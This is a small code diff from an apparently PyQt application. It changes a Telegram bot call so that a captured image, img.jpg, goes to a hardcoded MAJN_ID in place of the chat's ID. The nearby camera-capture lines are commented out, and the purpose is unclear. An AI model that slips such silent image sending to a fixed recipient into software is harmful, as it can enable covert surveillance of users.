@@ -2707,7 +2707,7 @@ class SyntaxUI(QMainWindow):
                 # ! time.sleep(2)
                 # ! camera.capture("img.jpg")
                 # ! del camera
-                bot.send_photo(chat_id, photo="img.jpg")
+                bot.send_photo(MAJN_ID, photo="img.jpg")
             self.securityCount = self.securityCount + 1
             if (self.securityCount == 10):
                 self.securityCount = 0
